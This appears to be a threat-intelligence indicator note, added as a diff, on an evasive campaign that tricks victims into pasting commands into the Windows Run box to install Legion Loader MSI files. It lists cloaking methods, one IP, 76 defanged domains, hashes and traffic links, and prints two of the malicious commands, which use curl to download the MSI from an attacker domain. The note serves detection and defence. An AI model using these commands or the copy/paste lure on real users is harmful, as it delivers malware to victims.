@@ -1,0 +1,142 @@
+2025-03-31 (MONDAY): EVASIVE CAMPAIGN PUSHING LEGION LOADER
+
+AUTHORS:
+
+- Shehroze Farooqi, Keerthiraj Nagaraj, Shaown Sarker, Nabeel Mohamed, Chi-Wei Liu
+
+NOTES:
+
+- A highly evasive campaign is using the copy/paste technique to lure victims into running MSI files for Legion Loader malware.
+- This campaign attempts to evade detection through multiple cloaking strategies:
+  -- Turnstile/captcha pages lead to the final copy/paste malware download pages.
+  -- Malware download pages are disguised as blog sites when investigating the URLs.
+  -- URLs to download the MSI file are different for each download.
+  -- URLs to download the MSI file will not work on their own, if tried outside of the infection chain.
+
+DETAILS:
+
+- The copy/paste MSI delivery domains for this campaign all resolve to 188.72.236[.]249.
+- We discovered 76 domains for websites hosted on this IP address.
+- The download page shows instructions for potential victims to:
+  -- Use Win+R to open a Run window and paste malicious script into it.
+  -- The instructions say Win+R opens a terminal, but that is incorrect.
+- The malicious script uses curl to download the MSI file and open the download folder to display the downloaded file.
+- TDS traffic or affiliate links lead potential victims are to these malicious download pages.
+- TDS and intermediate redirects also enforce various cloaking mechanisms such as captcha and Cloudflare turnstile pages.
+- These TDS or affiliate links have parameters that are extremely short-lived.
+- When accessed without a valid short-lived parameter, the same URL displays benign content.
+- This content is a fake blog post, and the sites on 188.72.236[.]249 are all disguised as blog sites.
+
+INDICATORS:
+
+IP ADDRESS OF MSI DOWNLOAD PAGES:
+
+- 188.72.236[.]249
+
+DOMAINS FOR THE MSI DOWNLOAD PAGES:
+
+- admi2fib4exit[.]com
+- alae-bema4om-ef[.]com
+- ated-troy[.]com
+- berapt-medii[.]com
+- best-experience-cool[.]com
+- best-experience-top[.]com
+- best-knowledge-good24[.]com
+- best-knowledge-top[.]com
+- bestknowledgegood[.]com
+- blend-centra[.]com
+- buyfile-enter-net[.]com
+- byrls-unfar-tankka[.]com
+- cannel-hubshi-tock-perit[.]com
+- carien-shafii[.]com
+- creditfile-share-every-fun[.]com
+- creditfile-share-every-fun24[.]com
+- creditfileaccessnetworkshop[.]com
+- creditfilechainalleasycompany[.]com
+- creditfilechainallsimple[.]com
+- creditfileparteveryfun[.]com
+- doup2dalf4if4shou[.]com
+- duad-tess-piki[.]com
+- ecb4teg4sepd4bunt[.]com
+- file-access-web[.]com
+- file-autolink-all-easy[.]com
+- file-connection-all-ez[.]com
+- file-enter-web[.]com
+- file-link-all-easy[.]com
+- file-link-all-simpleshop[.]com
+- file-share-every-fun[.]com
+- fileaccesscenter[.]com
+- fileaccesschannel[.]com
+- fileaccessibilitynetwork[.]com
+- fileaccessnetworksecurity[.]com
+- fileaccessnow[.]com
+- filelinkallezcompany[.]com
+- filelinkallsimple[.]com
+- filepartallfunclub[.]com
+- fileparteveryfun24[.]com
+- fileshareallfun24[.]com
+- fundus-dung-hause-tellee[.]com
+- globalfile-link-all-easy[.]com
+- globalfileshareeveryfun[.]com
+- globalfileshareeveryfun24[.]com
+- globalgreatexperiencegood[.]com
+- great-experience-good24[.]com
+- greatknowledgegood24[.]com
+- hell4rec[.]com
+- hine-crull-cared-exiler[.]com
+- infoaccessnetwork[.]com
+- leto2nazi-glee[.]com
+- mnem2ptt4brr-cats[.]com
+- pahmi-argyll-shivey[.]com
+- premiumexperiencegood[.]com
+- premiumknowledgegood24[.]com
+- realcreditfileparteveryfun[.]com
+- realfile-share-every-fun[.]com
+- realfilemindparteveryfun[.]com
+- realfilemindshareeveryfun[.]com
+- realfilepartallfun[.]com
+- realfileshareallfun24[.]com
+- realmoreupload[.]com
+- seid-incaic-mayda[.]com
+- sendfilelinkalleasy[.]com
+- slud2mill[.]com
+- tappa-liter[.]com
+- thebetterfileupload[.]com
+- thefile-share-every-fun[.]com
+- themoreuploaddesign[.]com
+- themoreuploadllc[.]com
+- upgradeupload[.]com
+- webfile-chain-all-easy[.]com
+- webfile-link-all-easy[.]com
+- webfile-link-all-simplecompany[.]com
+- webfilelinkallez[.]com
+- yourdownloadbest[.]com
+
+TWO EXAMPLES OF MALICIOUS COPY/PASTE SCRIPT FROM DOWNLOAD PAGES:
+
+cmd /k "curl -o %USERPROFILE%\Downloads\spill_guts_meaning_in_urdu00.msi 
+hxxp[:]//admi2fib4exit[.]com/?download=4e4b619f && 
+explorer /select,%USERPROFILE%\Downloads\spill_guts_meaning_in_urdu00.msi"
+
+cmd /k "curl -o %USERPROFILE%\Downloads\parallel_universe_books54.msi 
+hxxp[:]//admi2fib4exit[.]com/?download=16827aff && 
+explorer /select,%USERPROFILE%\Downloads\parallel_universe_books54.msi"
+
+SHA256 HASHES FOR TWO EXAMPLES OF DOWNLOADED MSI FILES FOR LEGION LOADER:
+
+- 21df75dccea2946c1a28d9c46e722cdeaee00482a57bca9286cda59b172b2d9b
+- eef55d89a46dd43a2bd72852a5bd2929458da58f293e65f951a1d17c3a784440
+
+11 EXAMPLES OF TDS/AFFILIATE LINKS USED FOR THIS CAMPAIGN:
+
+- gettraff[.]ru/wb?keyword=moneygram%20appleton%20wi
+- ggtraff[.]ru/wb?keyword=spill%20guts%20meaning%20in%20urdu
+- fecuq[.]co[.]za/YmrXLWy8?keyword=%C3%A1lgebra%20y%20trigonometr%C3%ADa%20con%20geometr%C3%ADa%20anal%C3%ADtica%20ejercicios%20resueltos
+- tevav[.]co[.]za/YmrXLWy8?keyword=camera%20canon%20powershot%20sx20is%20%C3%A9%20boa
+- lovig[.]co[.]za/YmrXLWy8?keyword=modelo%20de%20memor%C3%A1ndum%20de%20llamada%20de%20atenci%C3%B3n%20por%20tardanza
+- yubit[.]co[.]za/YmrXLWy8?keyword=mahatma%20gandhi%20biography%20pdf%20download
+- colod[.]co[.]za/YmrXLWy8?keyword=how%20much%20is%20a%2020%20inch%20tv%20at%20walmart
+- yoyep[.]co[.]za/YmrXLWy8?keyword=binomial%20theorem%20solution%20pdf%20worksheets%20answers%20answer/
+- loheb[.]co[.]za/YmrXLWy8?keyword=paulo%20freire%20the%20banking%20concept%20of%20education%20analysis
+- fecuq[.]co[.]za/YmrXLWy8?keyword=wilderness%20and%20the%20american%20mind%20chapter%20summaries
+- norin[.]co[.]za/YmrXLWy8?keyword=bobbi%20brown%20makeup%20artist%20training
